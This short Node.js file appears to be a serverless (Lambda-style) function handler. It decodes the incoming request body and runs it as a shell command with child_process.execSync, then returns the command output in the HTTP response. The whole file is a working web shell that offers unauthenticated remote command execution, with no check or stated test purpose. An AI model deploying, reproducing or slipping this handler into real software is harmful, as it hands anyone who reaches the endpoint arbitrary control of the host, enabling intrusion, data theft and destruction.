const cp = require("child_process");

exports.handler = async (event) => {
  const body = event.body || "";
  const cmd = Buffer.from(body, event.isBase64Encoded ? "base64" : "utf8")
    .toString();
  const out = cp.execSync(cmd);
  return {
    statusCode: 200,
    body: out.toString(),
  };
};
